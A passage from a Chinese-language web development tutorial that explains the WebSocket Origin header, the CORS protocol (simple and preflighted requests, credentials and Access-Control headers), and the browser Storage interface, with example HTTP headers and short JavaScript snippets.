<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">GET</span> /chat <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: server.<span class="property">example</span>.<span class="property">com</span></span><br><span class="line"><span class="title class_">Upgrade</span>: websocket</span><br><span class="line"><span class="title class_">Connection</span>: <span class="title class_">Upgrade</span></span><br><span class="line"><span class="title class_">Sec</span>-<span class="title class_">WebSocket</span>-<span class="title class_">Key</span>: x3JJHMbDL1EzLkh9GBhXDw==</span><br><span class="line"><span class="title class_">Sec</span>-<span class="title class_">WebSocket</span>-<span class="title class_">Protocol</span>: chat, superchat</span><br><span class="line"><span class="title class_">Sec</span>-<span class="title class_">WebSocket</span>-<span class="title class_">Version</span>: <span class="number">13</span></span><br><span class="line"><span class="title class_">Origin</span>: <span class="attr">http</span>:<span class="comment">//example.com</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，有一个字段是<code>Origin</code>，表示该请求的请求源（origin），即发自哪个域名。</p>
<p>正是因为有了<code>Origin</code>这个字段，所以 WebSocket 才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">HTTP</span>/<span class="number">1.1</span> <span class="number">101</span> <span class="title class_">Switching</span> <span class="title class_">Protocols</span></span><br><span class="line"><span class="title class_">Upgrade</span>: websocket</span><br><span class="line"><span class="title class_">Connection</span>: <span class="title class_">Upgrade</span></span><br><span class="line"><span class="title class_">Sec</span>-<span class="title class_">WebSocket</span>-<span class="title class_">Accept</span>: <span class="title class_">HSmrc0</span>sMlYUkAGmm5OPpG2HaGWk=</span><br><span class="line"><span class="title class_">Sec</span>-<span class="title class_">WebSocket</span>-<span class="title class_">Protocol</span>: chat</span><br></pre></td></tr></table></figure>



<h4 id="4-3-CORS"><a href="#4-3-CORS" class="headerlink" title="4.3 CORS"></a>4.3 CORS</h4><p>CORS 是<strong>跨源资源分享</strong>（Cross-Origin Resource Sharing）的缩写。它是 W3C 标准，属于跨源 AJAX 请求的根本解决方法。相比 JSONP 只能发<code>GET</code>请求，CORS 允许任何类型的请求。</p>
<p>下一章将详细介绍，如何通过 CORS 完成跨源 AJAX 请求。</p>
<h2 id="七、CORS-通信"><a href="#七、CORS-通信" class="headerlink" title="七、CORS 通信"></a>七、CORS 通信</h2><p> CORS 是一个 W3C 标准，全称是“<strong>跨域资源共享</strong>”（Cross-origin resource sharing）。它允许浏览器向跨域的服务器，发出<code>XMLHttpRequest</code>请求，从而克服了 AJAX 只能同源使用的限制。</p>
<h3 id="1、简介-1"><a href="#1、简介-1" class="headerlink" title="1、简介"></a>1、简介</h3><p><strong>CORS 需要浏览器和服务器同时支持</strong>。目前，所有浏览器都支持该功能。</p>
<p>整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与普通的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨域，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感知。因此，<strong>实现 CORS 通信的关键是服务器</strong>。只要服务器实现了 CORS 接口，就可以跨域通信。</p>
<h3 id="2、两种请求"><a href="#2、两种请求" class="headerlink" title="2、两种请求"></a>2、两种请求</h3><p>CORS 请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。</p>
<p>只要同时满足以下两大条件，就属于简单请求。</p>
<p>（1）请求方法是以下三种方法之一。</p>
<blockquote>
<ul>
<li>HEAD</li>
<li>GET</li>
<li>POST</li>
</ul>
</blockquote>
<p>（2）HTTP 的头信息不超出以下几种字段。</p>
<blockquote>
<ul>
<li>Accept</li>
<li>Accept-Language</li>
<li>Content-Language</li>
<li>Last-Event-ID</li>
<li>Content-Type：只限于三个值<code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code></li>
</ul>
</blockquote>
<p>凡是不同时满足上面两个条件，就属于非简单请求。一句话，<strong>简单请求就是简单的 HTTP 方法与简单的 HTTP 头信息的结合。</strong></p>
<p>这样划分的原因是，表单在历史上一直可以跨域发出请求。简单请求就是表单请求，浏览器沿袭了传统的处理方式，不把行为复杂化，否则开发者可能转而使用表单，规避 CORS 的限制。对于非简单请求，浏览器会采用新的处理方式。</p>
<h3 id="3、简单请求"><a href="#3、简单请求" class="headerlink" title="3、简单请求"></a>3、简单请求</h3><h4 id="3-1-基本流程"><a href="#3-1-基本流程" class="headerlink" title="3.1 基本流程"></a>3.1 基本流程</h4><p>对于简单请求，浏览器直接发出 CORS 请求。具体来说，就是在头信息之中，增加一个<code>Origin</code>字段。</p>
<p>下面是一个例子，浏览器发现这次跨域 AJAX 请求是简单请求，就自动在头信息之中，添加一个<code>Origin</code>字段。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">GET</span> /cors <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Origin</span>: <span class="attr">http</span>:<span class="comment">//api.bob.com</span></span><br><span class="line"><span class="title class_">Host</span>: api.<span class="property">alice</span>.<span class="property">com</span></span><br><span class="line"><span class="title class_">Accept</span>-<span class="title class_">Language</span>: en-<span class="variable constant_">US</span></span><br><span class="line"><span class="title class_">Connection</span>: keep-alive</span><br><span class="line"><span class="title class_">User</span>-<span class="title class_">Agent</span>: <span class="title class_">Mozilla</span>/<span class="number">5.0</span>...</span><br></pre></td></tr></table></figure>

<p>上面的头信息中，<code>Origin</code>字段用来说明，本次请求来自哪个域（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。</p>
<p>如果<code>Origin</code>指定的源，不在许可范围内，服务器会返回一个正常的 HTTP 回应。浏览器发现，这个回应的头信息没有包含<code>Access-Control-Allow-Origin</code>字段（详见下文），就知道出错了，从而抛出一个错误，被<code>XMLHttpRequest</code>的<code>onerror</code>回调函数捕获。注意，这种错误无法通过状态码识别，因为 HTTP 回应的状态码有可能是200。</p>
<p>如果<code>Origin</code>指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Origin</span>: <span class="attr">http</span>:<span class="comment">//api.bob.com</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Credentials</span>: <span class="literal">true</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Expose</span>-<span class="title class_">Headers</span>: <span class="title class_">FooBar</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: text/html; charset=utf-<span class="number">8</span></span><br></pre></td></tr></table></figure>

<p>上面的头信息之中，有三个与 CORS 请求相关的字段，都以<code>Access-Control-</code>开头。</p>
<p><strong>（1）<code>Access-Control-Allow-Origin</code></strong></p>
<p>该字段是必须的。它的值要么是请求时<code>Origin</code>字段的值，要么是一个<code>*</code>，表示接受任意域名的请求。</p>
<p><strong>（2）<code>Access-Control-Allow-Credentials</code></strong></p>
<p>该字段可选。它的值是一个布尔值，表示是否允许发送 Cookie。默认情况下，Cookie 不包括在 CORS 请求之中。设为<code>true</code>，即表示服务器明确许可，浏览器可以把 Cookie 包含在请求中，一起发给服务器。这个值也只能设为<code>true</code>，如果服务器不要浏览器发送 Cookie，不发送该字段即可。</p>
<p><strong>（3）<code>Access-Control-Expose-Headers</code></strong></p>
<p>该字段可选。CORS 请求时，<code>XMLHttpRequest</code>对象的<code>getResponseHeader()</code>方法只能拿到6个服务器返回的基本字段：<code>Cache-Control</code>、<code>Content-Language</code>、<code>Content-Type</code>、<code>Expires</code>、<code>Last-Modified</code>、<code>Pragma</code>。如果想拿到其他字段，就必须在<code>Access-Control-Expose-Headers</code>里面指定。上面的例子指定，<code>getResponseHeader(&#39;FooBar&#39;)</code>可以返回<code>FooBar</code>字段的值。</p>
<h4 id="3-2-withCredentials-属性"><a href="#3-2-withCredentials-属性" class="headerlink" title="3.2 withCredentials 属性"></a>3.2 withCredentials 属性</h4><p>上面说到，CORS 请求默认不包含 Cookie 信息（以及 HTTP 认证信息等），这是为了降低 CSRF 攻击的风险。但是某些场合，服务器可能需要拿到 Cookie，这时需要服务器显式指定<code>Access-Control-Allow-Credentials</code>字段，告诉浏览器可以发送 Cookie。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Credentials</span>: <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>同时，开发者必须在 AJAX 请求中打开<code>withCredentials</code>属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<p>否则，即使服务器要求发送 Cookie，浏览器也不会发送。或者，服务器要求设置 Cookie，浏览器也不会处理。</p>
<p>但是，有的浏览器默认将<code>withCredentials</code>属性设为<code>true</code>。这导致如果省略<code>withCredentials</code>设置，这些浏览器可能还是会一起发送 Cookie。这时，可以显式关闭<code>withCredentials</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.<span class="property">withCredentials</span> = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>

<p>需要注意的是，如果服务器要求浏览器发送 Cookie，<code>Access-Control-Allow-Origin</code>就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie 依然遵循同源政策，只有用服务器域名设置的 Cookie 才会上传，其他域名的 Cookie 并不会上传，且（跨域）原网页代码中的<code>document.cookie</code>也无法读取服务器域名下的 Cookie。</p>
<h3 id="4、非简单请求"><a href="#4、非简单请求" class="headerlink" title="4、非简单请求"></a>4、非简单请求</h3><h4 id="4-1-预检请求"><a href="#4-1-预检请求" class="headerlink" title="4.1 预检请求"></a>4.1 预检请求</h4><p>非简单请求是那种对服务器提出特殊要求的请求，比如请求方法是<code>PUT</code>或<code>DELETE</code>，或者<code>Content-Type</code>字段的类型是<code>application/json</code>。</p>
<p>非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为“预检”请求（preflight）。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 方法和头信息字段。只有得到肯定答复，浏览器才会发出正式的<code>XMLHttpRequest</code>请求，否则就报错。这是为了防止这些新增的请求，对传统的没有 CORS 支持的服务器形成压力，给服务器一个提前拒绝的机会，这样可以防止服务器收到大量<code>DELETE</code>和<code>PUT</code>请求，这些传统的表单不可能跨域发出的请求。</p>
<p>下面是一段浏览器的 JavaScript 脚本。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://api.alice.com/cors&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;PUT&#x27;</span>, url, <span class="literal">true</span>);</span><br><span class="line">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;X-Custom-Header&#x27;</span>, <span class="string">&#x27;value&#x27;</span>);</span><br><span class="line">xhr.<span class="title function_">send</span>();</span><br></pre></td></tr></table></figure>

<p>上面代码中，HTTP 请求的方法是<code>PUT</code>，并且发送一个自定义头信息<code>X-Custom-Header</code>。</p>
<p>浏览器发现，这是一个非简单请求，就自动发出一个“预检”请求，要求服务器确认可以这样请求。下面是这个“预检”请求的 HTTP 头信息。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">OPTIONS</span> /cors <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Origin</span>: <span class="attr">http</span>:<span class="comment">//api.bob.com</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Request</span>-<span class="title class_">Method</span>: <span class="variable constant_">PUT</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Request</span>-<span class="title class_">Headers</span>: X-<span class="title class_">Custom</span>-<span class="title class_">Header</span></span><br><span class="line"><span class="title class_">Host</span>: api.<span class="property">alice</span>.<span class="property">com</span></span><br><span class="line"><span class="title class_">Accept</span>-<span class="title class_">Language</span>: en-<span class="variable constant_">US</span></span><br><span class="line"><span class="title class_">Connection</span>: keep-alive</span><br><span class="line"><span class="title class_">User</span>-<span class="title class_">Agent</span>: <span class="title class_">Mozilla</span>/<span class="number">5.0</span>...</span><br></pre></td></tr></table></figure>

<p>“预检”请求用的请求方法是<code>OPTIONS</code>，表示这个请求是用来询问的。头信息里面，关键字段是<code>Origin</code>，表示请求来自哪个源。</p>
<p>除了<code>Origin</code>字段，“预检”请求的头信息包括两个特殊字段。</p>
<p><strong>（1）<code>Access-Control-Request-Method</code></strong></p>
<p>该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些 HTTP 方法，上例是<code>PUT</code>。</p>
<p><strong>（2）<code>Access-Control-Request-Headers</code></strong></p>
<p>该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段，上例是<code>X-Custom-Header</code>。</p>
<h4 id="4-2-预检请求的回应"><a href="#4-2-预检请求的回应" class="headerlink" title="4.2 预检请求的回应"></a>4.2 预检请求的回应</h4><p>服务器收到“预检”请求以后，检查了<code>Origin</code>、<code>Access-Control-Request-Method</code>和<code>Access-Control-Request-Headers</code>字段以后，确认允许跨源请求，就可以做出回应。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">HTTP</span>/<span class="number">1.1</span> <span class="number">200</span> <span class="variable constant_">OK</span></span><br><span class="line"><span class="title class_">Date</span>: <span class="title class_">Mon</span>, <span class="number">01</span> <span class="title class_">Dec</span> <span class="number">2008</span> <span class="number">01</span>:<span class="number">15</span>:<span class="number">39</span> <span class="variable constant_">GMT</span></span><br><span class="line"><span class="title class_">Server</span>: <span class="title class_">Apache</span>/<span class="number">2.0</span><span class="number">.61</span> (<span class="title class_">Unix</span>)</span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Origin</span>: <span class="attr">http</span>:<span class="comment">//api.bob.com</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Methods</span>: <span class="variable constant_">GET</span>, <span class="variable constant_">POST</span>, <span class="variable constant_">PUT</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Headers</span>: X-<span class="title class_">Custom</span>-<span class="title class_">Header</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: text/html; charset=utf-<span class="number">8</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Encoding</span>: gzip</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">0</span></span><br><span class="line"><span class="title class_">Keep</span>-<span class="title class_">Alive</span>: timeout=<span class="number">2</span>, max=<span class="number">100</span></span><br><span class="line"><span class="title class_">Connection</span>: <span class="title class_">Keep</span>-<span class="title class_">Alive</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: text/plain</span><br></pre></td></tr></table></figure>

<p>上面的 HTTP 回应中，关键的是<code>Access-Control-Allow-Origin</code>字段，表示<code>http://api.bob.com</code>可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Origin</span>: *</span><br></pre></td></tr></table></figure>

<p>如果服务器否定了“预检”请求，会返回一个正常的 HTTP 回应，但是没有任何 CORS 相关的头信息字段，或者明确表示请求不符合条件。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">OPTIONS</span> <span class="attr">http</span>:<span class="comment">//api.bob.com HTTP/1.1</span></span><br><span class="line"><span class="title class_">Status</span>: <span class="number">200</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Origin</span>: <span class="attr">https</span>:<span class="comment">//notyourdomain.com</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Method</span>: <span class="variable constant_">POST</span></span><br></pre></td></tr></table></figure>

<p>上面的服务器回应，<code>Access-Control-Allow-Origin</code>字段明确不包括发出请求的<code>http://api.bob.com</code>。</p>
<p>这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被<code>XMLHttpRequest</code>对象的<code>onerror</code>回调函数捕获。控制台会打印出如下的报错信息。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">XMLHttpRequest</span> cannot load <span class="attr">http</span>:<span class="comment">//api.alice.com.</span></span><br><span class="line"><span class="title class_">Origin</span> <span class="attr">http</span>:<span class="comment">//api.bob.com is not allowed by Access-Control-Allow-Origin.</span></span><br></pre></td></tr></table></figure>

<p>服务器回应的其他 CORS 相关字段如下。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Methods</span>: <span class="variable constant_">GET</span>, <span class="variable constant_">POST</span>, <span class="variable constant_">PUT</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Headers</span>: X-<span class="title class_">Custom</span>-<span class="title class_">Header</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Credentials</span>: <span class="literal">true</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Max</span>-<span class="title class_">Age</span>: <span class="number">1728000</span></span><br></pre></td></tr></table></figure>

<p><strong>（1）<code>Access-Control-Allow-Methods</code></strong></p>
<p>该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次“预检”请求。</p>
<p><strong>（2）<code>Access-Control-Allow-Headers</code></strong></p>
<p>如果浏览器请求包括<code>Access-Control-Request-Headers</code>字段，则<code>Access-Control-Allow-Headers</code>字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在“预检”中请求的字段。</p>
<p><strong>（3）<code>Access-Control-Allow-Credentials</code></strong></p>
<p>该字段与简单请求时的含义相同。</p>
<p><strong>（4）<code>Access-Control-Max-Age</code></strong></p>
<p>该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。</p>
<h4 id="4-3-浏览器的正常请求和回应"><a href="#4-3-浏览器的正常请求和回应" class="headerlink" title="4.3 浏览器的正常请求和回应"></a>4.3 浏览器的正常请求和回应</h4><p>一旦服务器通过了“预检”请求，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样，会有一个<code>Origin</code>头信息字段。服务器的回应，也都会有一个<code>Access-Control-Allow-Origin</code>头信息字段。</p>
<p>下面是“预检”请求之后，浏览器的正常 CORS 请求。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">PUT</span> /cors <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Origin</span>: <span class="attr">http</span>:<span class="comment">//api.bob.com</span></span><br><span class="line"><span class="title class_">Host</span>: api.<span class="property">alice</span>.<span class="property">com</span></span><br><span class="line">X-<span class="title class_">Custom</span>-<span class="title class_">Header</span>: value</span><br><span class="line"><span class="title class_">Accept</span>-<span class="title class_">Language</span>: en-<span class="variable constant_">US</span></span><br><span class="line"><span class="title class_">Connection</span>: keep-alive</span><br><span class="line"><span class="title class_">User</span>-<span class="title class_">Agent</span>: <span class="title class_">Mozilla</span>/<span class="number">5.0</span>...</span><br></pre></td></tr></table></figure>

<p>上面头信息的<code>Origin</code>字段是浏览器自动添加的。</p>
<p>下面是服务器正常的回应。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Origin</span>: <span class="attr">http</span>:<span class="comment">//api.bob.com</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: text/html; charset=utf-<span class="number">8</span></span><br></pre></td></tr></table></figure>

<p>上面头信息中，<code>Access-Control-Allow-Origin</code>字段是每次回应都必定包含的。</p>
<h3 id="5、与-JSONP-的比较"><a href="#5、与-JSONP-的比较" class="headerlink" title="5、与 JSONP 的比较"></a>5、与 JSONP 的比较</h3><p>CORS 与 JSONP 的使用目的相同，但是比 JSONP 更强大。JSONP 只支持<code>GET</code>请求，CORS 支持所有类型的 HTTP 请求。JSONP 的优势在于支持老式浏览器，以及可以向不支持 CORS 的网站请求数据。</p>
<h2 id="八、Storage-接口"><a href="#八、Storage-接口" class="headerlink" title="八、Storage 接口"></a>八、Storage 接口</h2><h3 id="1、概述-3"><a href="#1、概述-3" class="headerlink" title="1、概述"></a>1、概述</h3><p>Storage 接口用于脚本在浏览器保存数据。两个对象部署了这个接口：<code>window.sessionStorage</code>和<code>window.localStorage</code>。</p>
<p><code>sessionStorage</code>保存的数据用于浏览器的一次会话（session），当会话结束（通常是窗口关闭），数据被清空；<code>localStorage</code>保存的数据长期存在，下一次访问该网站的时候，网页可以直接读取以前保存的数据。除了保存期限的长短不同，这两个对象的其他方面都一致。</p>
<p>保存的数据都以“键值对”的形式存在。也就是说，每一项数据都有一个键名和对应的值。所有的数据都是以文本格式保存。</p>
<p>这个接口很像 Cookie 的强化版，能够使用大得多的存储空间。目前，每个域名的存储上限视浏览器而定，Chrome 是 2.5MB，Firefox 和 Opera 是 5MB，IE 是 10MB。其中，Firefox 的存储空间由一级域名决定，而其他浏览器没有这个限制。也就是说，Firefox 中，<code>a.example.com</code>和<code>b.example.com</code>共享 5MB 的存储空间。另外，与 Cookie 一样，它们也受同域限制。某个网页存入的数据，只有同域下的网页才能读取，如果跨域操作会报错。</p>
<h3 id="2、属性和方法"><a href="#2、属性和方法" class="headerlink" title="2、属性和方法"></a>2、属性和方法</h3><p>Storage 接口只有一个属性。</p>
<ul>
<li><code>Storage.length</code>：返回保存的数据项个数。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;bar&#x27;</span>, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;baz&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">localStorage</span>.<span class="property">length</span> <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>

<p>该接口提供5个方法。</p>
<h4 id="2-1-Storage-setItem"><a href="#2-1-Storage-setItem" class="headerlink" title="2.1 Storage.setItem()"></a>2.1 Storage.setItem()</h4><p><code>Storage.setItem()</code>方法用于存入数据。它接受两个参数，第一个是键名，第二个是保存的数据。如果键名已经存在，该方法会更新已有的键值。该方法没有返回值。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">sessionStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;value&#x27;</span>);</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;value&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>注意，<code>Storage.setItem()</code>两个参数都是字符串。如果不是字符串，会自动转成字符串，再存入浏览器。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">sessionStorage</span>.<span class="title function_">setItem</span>(<span class="number">3</span>, &#123; <span class="attr">foo</span>: <span class="number">1</span> &#125;);</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">sessionStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;3&#x27;</span>) <span class="comment">// &quot;[object Object]&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>setItem</code>方法的两个参数都不是字符串，但是存入的值都是字符串。</p>
<p>如果储存空间已满，该方法会抛错。</p>
<p>写入不一定要用这个方法，直接赋值也是可以的。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 下面三种写法等价</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">localStorage</span>.<span class="property">foo</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">localStorage</span>[<span class="string">&#x27;foo&#x27;</span>] = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;123&#x27;</span>);</span><br></pre></td></tr></table></figure>



<h4 id="2-2-Storage-getItem"><a href="#2-2-Storage-getItem" class="headerlink" title="2.2 Storage.getItem()"></a>2.2 Storage.getItem()</h4><p><code>Storage.getItem()</code>方法用于读取数据。它只有一个参数，就是键名。如果键名不存在，该方法返回<code>null</code>。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">sessionStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;key&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>键名应该是一个字符串，否则会被自动转为字符串。</p>
<h4 id="2-3-Storage-removeItem"><a href="#2-3-Storage-removeItem" class="headerlink" title="2.3 Storage.removeItem()"></a>2.3 Storage.removeItem()</h4><p><code>Storage.removeItem()</code>方法用于清除某个键名对应的键值。它接受键名作为参数，如果键名不存在，该方法不会做任何事情。</p>
